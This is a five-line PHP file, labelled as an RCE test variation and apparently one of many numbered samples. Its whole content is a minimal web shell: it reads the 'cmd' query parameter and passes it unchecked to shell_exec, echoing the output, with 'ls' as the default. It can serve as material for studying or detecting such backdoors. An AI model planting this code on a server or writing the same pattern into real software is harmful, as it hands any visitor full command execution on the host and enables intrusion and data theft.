<?php
// RCE test variation #608
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>